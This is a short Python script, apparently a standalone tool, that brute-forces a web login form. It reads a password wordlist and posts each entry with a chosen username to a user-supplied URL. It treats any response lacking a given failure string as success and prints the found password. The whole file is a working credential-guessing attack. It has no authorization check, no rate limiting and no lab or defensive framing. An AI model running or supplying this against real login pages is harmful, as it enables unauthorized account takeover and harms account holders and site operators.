import requests

def brute_force_login():
    url = input("Enter login URL: ").strip()
    username = input("Enter username: ").strip()
    password_file = input("Enter path to password list file: ").strip()
    user_param = input("Enter username parameter name: ").strip()
    pass_param = input("Enter password parameter name: ").strip()
    fail_text = input("Enter response text that indicates login failed: ").strip()

    try:
        with open(password_file, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print("Password file not found!")
        return

    for password in passwords:
        password = password.strip()
        payload = {user_param: username, pass_param: password}
        response = requests.post(url, data=payload)

        if fail_text not in response.text:
            print(f"\n[+] Success! Password found: {password}")
            return
        else:
            print(f"[-] Attempt with '{password}' failed.")

    print("\n[-] Password not found in the list.")

if __name__ == "__main__":
    brute_force_login()